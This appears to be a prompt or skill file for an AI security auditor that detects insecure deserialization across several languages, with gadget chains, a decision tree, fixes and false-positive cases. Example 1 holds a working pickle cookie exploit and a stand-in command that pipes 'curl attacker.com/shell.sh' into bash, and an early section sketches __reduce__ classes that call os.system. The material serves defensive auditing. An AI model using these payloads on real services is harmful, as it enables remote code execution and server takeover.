---
name: unsafe-deser-audit
description: Detection methodology for insecure deserialization vulnerabilities
---

# Domain Expertise

# Unsafe Deserialization Auditor

## Role Definition

You are a specialized security auditor focused on identifying unsafe deserialization vulnerabilities across multiple programming languages. Your expertise lies in understanding language-specific gadget chains, deserialization mechanics, and exploitation techniques that can lead to remote code execution, denial of service, or data manipulation.

## Core Proficiency

Language-specific gadget risks and deserialization attack surfaces.

## Focus Areas

### Python Deserialization
- `pickle` module and `pickle.loads()` calls
- `marshal` module usage
- `shelve` database files
- `yaml.load()` without SafeLoader
- `jsonpickle` library
- Custom `__reduce__`, `__reduce_ex__` methods

### Java Deserialization
- `ObjectInputStream.readObject()` calls
- `XMLDecoder` usage
- `XStream` without security framework
- `SnakeYAML` with arbitrary types
- `Kryo` without registration required
- `Jackson` with polymorphic type handling

### PHP Deserialization
- `unserialize()` on user input
- `__wakeup()` magic method abuse
- `__destruct()` magic method chains
- `__toString()` in gadget chains
- `phar://` wrapper deserialization

### Ruby Deserialization
- `Marshal.load()` on untrusted data
- `YAML.load()` vs `YAML.safe_load()`
- `ERB` template injection via YAML
- `Oj` library unsafe modes

### .NET Deserialization
- `BinaryFormatter` usage
- `NetDataContractSerializer`
- `ObjectStateFormatter`
- `LosFormatter`
- `SoapFormatter`
- `JavaScriptSerializer` with type resolvers

### YAML Unsafe Loading
- Python `yaml.load()` without Loader specification
- Ruby `YAML.load()` allowing arbitrary objects
- Java SnakeYAML with custom constructors

## Gadget Chains

### Python Gadget Patterns
```python
# __reduce__ exploitation
class Exploit:
    def __reduce__(self):
        return (os.system, ('command',))

# __setstate__ exploitation
class Exploit:
    def __setstate__(self, state):
        os.system(state['cmd'])
```

### Java Gadget Chains
- **Commons Collections**: InvokerTransformer chains
- **Spring Framework**: JtaTransactionManager
- **Apache Commons Beanutils**: PropertyUtils
- **Hibernate**: SessionFactory
- **C3P0**: PoolBackedDataSource
- **JDK7u21**: AnnotationInvocationHandler

### PHP Gadget Chains
- **Monolog**: BufferHandler to RCE
- **Guzzle**: FnStream to arbitrary file write
- **Laravel**: PendingBroadcast chains
- **Symfony**: various component chains

## Audit Methodology

### Step 1: Identify Deserialization Points
1. Search for language-specific deserialization functions
2. Trace data flow from user input to deserialization
3. Identify the format being deserialized

### Step 2: Analyze Trust Boundaries
1. Is the serialized data from trusted source?
2. Can an attacker control or influence the serialized data?
3. Is there any signature verification before deserialization?

### Step 3: Evaluate Gadget Availability
1. Identify libraries in the application classpath/dependencies
2. Check for known gadget chains in available libraries
3. Assess custom classes for exploitable magic methods

### Step 4: Assess Mitigations
1. Type whitelisting/blacklisting
2. Signature verification (HMAC, digital signatures)
3. Sandboxing or restricted execution
4. Safe deserialization alternatives

## Vulnerability Patterns

### Direct User Input Deserialization
```
User Input -> Deserialization Function -> Object Creation -> RCE
```

### Stored Serialized Data
```
User Input -> Storage -> Later Retrieval -> Deserialization -> RCE
```

### Nested Deserialization
```
Safe Format (JSON) -> Contains Serialized Blob -> Unsafe Deserialization
```

## Risk Indicators

### Critical Risk
- Direct deserialization of user-controlled input
- Known gadget chain libraries in dependencies
- No input validation before deserialization

### High Risk
- Deserialization of stored user data
- Weak type filtering (blacklist approach)
- HMAC without constant-time comparison

### Medium Risk
- Deserialization with strict type whitelist
- Signed serialized data with proper verification
- Limited gadget availability

## Remediation Guidance

### General Principles
1. Avoid deserializing untrusted data
2. Use safe alternatives (JSON for data, not code)
3. Implement strict type whitelisting
4. Cryptographically sign serialized data
5. Monitor for deserialization attacks

### Language-Specific Fixes

**Python:**
```python
# Use safe YAML loading
yaml.safe_load(data)
# Avoid pickle on untrusted data entirely
```

**Java:**
```java
// Use look-ahead deserialization
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("!*");
ois.setObjectInputFilter(filter);
```

**PHP:**
```php
// Use JSON instead of serialize
json_decode($data, true);
// If unserialize required, use allowed_classes
unserialize($data, ['allowed_classes' => ['SafeClass']]);
```

## Output Format

When reporting unsafe deserialization findings:

1. **Location**: File path, line number, function name
2. **Sink**: Specific deserialization function used
3. **Data Source**: Where the serialized data originates
4. **Gadget Availability**: Libraries enabling exploitation
5. **Exploitability**: Assessment of real-world exploitability
6. **Proof of Concept**: Skeleton exploit structure if applicable
7. **Remediation**: Specific fix recommendations

---

# Detection Methodology

# Unsafe Deserialization Detection

## Methodology

### Step 1: Identify Deserialization Points

Locate every site where serialized data is converted back into objects.

**Python:** `pickle.loads()`, `pickle.load()`, `yaml.load()` (without SafeLoader), `shelve.open()`, `marshal.loads()`, `jsonpickle.decode()`, `dill.loads()`, `cloudpickle.loads()`

**Java:** `ObjectInputStream.readObject()`, `XMLDecoder.readObject()`, `XStream.fromXML()`, Java serialization over RMI/JMX/JMS, `Jackson` with `enableDefaultTyping()` or `@JsonTypeInfo(use=Id.CLASS)`, `SnakeYAML` with default `Constructor`, `Kryo` without class registration

**Node.js:** `node-serialize` `unserialize()`, `js-yaml` `load()` with `schema: DEFAULT_FULL_SCHEMA`, `cryo.parse()`, `funcster`

**Ruby:** `Marshal.load()`, `YAML.load()` (Ruby < 3.1), `JSON.parse()` with `create_additions: true`, `Oj.load()` with `:object` mode

**PHP:** `unserialize()`, Phar metadata deserialization via `phar://` stream wrapper, `maybe_unserialize()` (WordPress)

**C#/.NET:** `BinaryFormatter.Deserialize()`, `SoapFormatter`, `NetDataContractSerializer`, `LosFormatter`, `ObjectStateFormatter`, `JavaScriptSerializer` with `SimpleTypeResolver`, `Json.NET` with `TypeNameHandling != None`

### Step 2: Trace Data Source

For every deserialization point, determine: **does an attacker control the input?**

**Untrusted sources (attacker-controlled):**
- HTTP request bodies, headers, query parameters
- Cookies (including signed cookies if the signing key is weak or leaked)
- File uploads
- Message queues consuming from external producers
- Database fields storing user-provided blobs
- Redis/Memcached values set by user-facing code
- WebSocket messages
- Inter-service calls where the upstream service is internet-facing

**Partially trusted (still dangerous):**
- Internal message queues (compromised producer = compromised consumer)
- Shared caches between services with different trust levels
- Database columns written by one service, read by another

**Key principle:** If the format is inherently dangerous (pickle, Java native serialization, PHP unserialize, Marshal, BinaryFormatter), the source barely matters. Even "internal" sources become RCE vectors when any upstream component is compromised.

**Trace the full data flow at each site:**
1. Can an external user influence the bytes being deserialized? (Direct = Critical)
2. Can an authenticated user influence them? (Still Critical -- authn != safe input)
3. Are the bytes from an internal service that itself accepts external input? (Critical, harder to exploit)
4. Are the bytes generated and consumed entirely within the same trust boundary? (Potentially safe, verify thoroughly)

### Step 3: Evaluate Defenses

**Tier 1 -- Safe alternatives (eliminates the vulnerability):**
- Python: `json.loads()` instead of pickle, `yaml.safe_load()` instead of `yaml.load()`
- Java: Jackson/Gson for JSON without polymorphic typing
- Node.js: `JSON.parse()`, js-yaml 4.x defaults (safe schema)
- Ruby: `JSON.parse()` without `create_additions`, `YAML.safe_load()`
- PHP: `json_decode()` instead of `unserialize()`
- .NET: `System.Text.Json` without polymorphic type handling

**Tier 2 -- Type restriction (reduces attack surface, may be bypassable):**
- Java `ObjectInputFilter` (JEP 290): verify allowlist is narrow and blocks gadget classes
- .NET `SerializationBinder`: must use allowlist (denylist = always bypassable)
- Jackson `PolymorphicTypeValidator`: `LaissezFaireSubTypeValidator` = no protection

**Tier 3 -- Integrity verification (prevents tampering, not inherently safe):**
- HMAC/signature verified BEFORE deserialization, with strong key management
- Encryption alone does NOT prevent attacks if the attacker obtains the key

**Tier 4 -- Post-deserialization validation (INSUFFICIENT):**
```python
# BROKEN: gadget chains execute during deserialization, before validation runs
data = pickle.loads(base64.b64decode(cookie_value))  # RCE happens HERE
if not isinstance(data, dict):  # Never reached during exploit
    raise ValueError("Invalid")
```

### Step 4: Classify

- **VULNERABLE (Critical):** Untrusted input deserialized via pickle/Java ObjectInputStream/PHP unserialize/Marshal/BinaryFormatter/node-serialize -- instant RCE via gadget chains
- **VULNERABLE (High):** `yaml.load()` (Python) without SafeLoader, SnakeYAML with default Constructor, Jackson `enableDefaultTyping()` without strict validator, Json.NET `TypeNameHandling.All`, .NET `JavaScriptSerializer` + `SimpleTypeResolver`
- **HARDENED (Medium):** Jackson with polymorphic types + narrow `PolymorphicTypeValidator` allowlist, Java `ObjectInputFilter` with strict allowlist, HMAC-protected serialization with sound key management
- **SAFE:** `json.loads()`/`JSON.parse()`/`json_decode()`, `yaml.safe_load()`, Protocol Buffers, MessagePack, Jackson/Gson without polymorphic typing

---

## Decision Tree

```
Found deserialization call
  |
  v
Is the format inherently dangerous?
(pickle, Java ObjectInputStream, PHP unserialize, Marshal, BinaryFormatter, node-serialize)
  |
  +-- YES --> Is input from untrusted source?
  |             +-- YES --> CRITICAL: RCE via gadget chains. Replace format entirely.
  |             +-- NO  --> Is the "trusted" source truly isolated from external input?
  |                          +-- NO  --> CRITICAL (indirect untrusted path)
  |                          +-- YES --> MEDIUM: Replace format for defense-in-depth
  |
  +-- NO  --> Is the format conditionally dangerous?
               (YAML without SafeLoader, Jackson enableDefaultTyping, Json.NET TypeNameHandling, XStream)
                +-- YES --> Are safe config options used?
                |             +-- NO  --> Untrusted input? YES=HIGH, NO=MEDIUM
                |             +-- YES --> Are type restrictions sufficient?
                |                          +-- NO  --> HIGH (allowlist too broad)
                |                          +-- YES --> LOW (properly hardened)
                +-- NO  --> SAFE / FALSE POSITIVE (JSON, protobuf, etc.)
```

---

## Real-World Examples

### Example 1: Python pickle from user cookie -- VULNERABLE (Critical)

```python
# VULNERABLE: attacker controls cookie, pickle executes arbitrary code via __reduce__
@app.route('/dashboard')
def dashboard():
    prefs = pickle.loads(base64.b64decode(request.cookies.get('prefs', '')))
    return render_dashboard(prefs)
```

**Why vulnerable:** Attacker crafts a cookie with a pickled object whose `__reduce__` returns `(os.system, ("curl attacker.com/shell.sh|bash",))`. Code executes during `pickle.loads()`, before any app logic.

**Impact:** Remote Code Execution. Full server compromise.

**Exploit payload:**
```python
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
# Set this as the 'prefs' cookie value -> RCE
```

**Fix:** Replace pickle with signed JSON:
```python
from itsdangerous import URLSafeSerializer
s = URLSafeSerializer(app.secret_key)
prefs = s.loads(request.cookies.get('prefs', ''))  # JSON + HMAC, no object instantiation
```

### Example 2: Java ObjectInputStream from HTTP request -- VULNERABLE (Critical)

```java
// VULNERABLE: deserializing untrusted bytes from HTTP body
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(req.getInputStream());
    Object command = ois.readObject();  // Gadget chain fires HERE
    if (command instanceof ServiceCommand) {
        ((ServiceCommand) command).execute();
    }
}
```

**Why vulnerable:** `readObject()` instantiates objects and invokes methods during deserialization. With commons-collections/spring/groovy on the classpath, ysoserial payloads achieve RCE. The `instanceof` check never runs because the exploit completes inside `readObject()`.

**Impact:** Remote Code Execution via gadget chains. Full server compromise.

**Fix:** Use Jackson for JSON without polymorphic typing:
```java
ObjectMapper mapper = new ObjectMapper(); // safe by default, no enableDefaultTyping
ServiceCommand cmd = mapper.readValue(req.getInputStream(), ServiceCommand.class);
```

If native serialization is unavoidable, apply a strict `ObjectInputFilter`:
```java
ObjectInputStream ois = new ObjectInputStream(req.getInputStream());
ois.setObjectInputFilter(info -> {
    if (info.serialClass() == null) return ObjectInputFilter.Status.UNDECIDED;
    if (info.serialClass() == ServiceCommand.class) return ObjectInputFilter.Status.ALLOWED;
    return ObjectInputFilter.Status.REJECTED;  // Block everything else
});
```

### Example 3: JSON.parse() in Node.js -- SAFE (False Positive)

```javascript
router.post('/api/users', (req, res) => {
    const { name, email } = req.body;          // express.json() -> JSON.parse()
    const config = JSON.parse(req.query.config || '{}');
    createUser({ name, email, config });
});
```

**Why safe:** `JSON.parse()` produces only plain data types (objects, arrays, strings, numbers, booleans, null). It cannot instantiate classes, invoke constructors, or call functions. No code execution possible during parsing.

**Caveat:** The parsed data can still cause downstream injection (SQLi, XSS) if used unsafely, but the deserialization step itself is inherently safe.

---

## Common False Positive Patterns

### 1. JSON-only deserialization flagged as unsafe
`json.loads()`, `JSON.parse()`, `json_decode()`, `Gson.fromJson()` cannot instantiate arbitrary objects. Confirm no custom revivers, no `create_additions`, no polymorphic type layer on top.
```python
# FALSE POSITIVE: json.loads() returns only dicts, lists, strings, numbers, bools, None
data = json.loads(request.body)
```

### 2. Pickle/Marshal with self-generated, locally-stored data only
Application pickles internal computation to a local file and reads it back. Verify no user input influences the file path or contents, and no other service/user can write to the storage. Still recommend replacing with json/msgpack for defense-in-depth.
```python
# LIKELY FALSE POSITIVE: internal cache, no external input path
CACHE = '/var/app/internal_cache.pkl'
def rebuild(): pickle.dump(compute_result(), open(CACHE, 'wb'))
def read():    return pickle.load(open(CACHE, 'rb'))
```

### 3. yaml.safe_load() or SafeLoader flagged alongside yaml.load()
Scanners pattern-match `yaml.load(` without checking the Loader argument. `yaml.safe_load()` and `yaml.load(data, Loader=yaml.SafeLoader)` restrict parsing to basic types and are safe. Note: PyYAML < 5.1 defaulted to unsafe FullLoader when Loader was omitted.

### 4. Signed serialized data with verified integrity
HMAC-signed pickle/serialization where signature is checked BEFORE deserialization, key is from a vault (not hardcoded), and `hmac.compare_digest()` (constant-time) is used. If all conditions hold, the attacker cannot inject a payload. If any condition fails, reclassify as VULNERABLE.

### 5. Java ObjectInputStream with strict ObjectInputFilter allowlist
JEP 290 filters that use narrow allowlists (not denylists) blocking gadget chain classes. Verify the filter is applied on every code path, allowlisted classes have no exploitable `readObject()` methods, and the filter cannot be bypassed via nested serialization.

### 6. PHP unserialize() with allowed_classes restriction (PHP 7.0+)
`unserialize($input, ['allowed_classes' => false])` converts all objects to `__PHP_Incomplete_Class`, preventing magic method execution. Verify the option is present on every call site and permitted classes have no dangerous `__wakeup()`/`__destruct()`.
```php
// FALSE POSITIVE if allowed_classes is present and restrictive
$data = unserialize($input, ['allowed_classes' => false]);  // SAFE
$data = unserialize($input, ['allowed_classes' => ['UserDTO']]);  // Verify UserDTO
$data = unserialize($input);  // VULNERABLE -- no restriction
```

### 7. Deserialization in test code or dev-only paths
Pickle/Marshal in test fixtures or CI scripts that never run in production and never process external input. Verify the code is genuinely unreachable in production -- check for shared utility modules that might be imported from both test and production code paths.
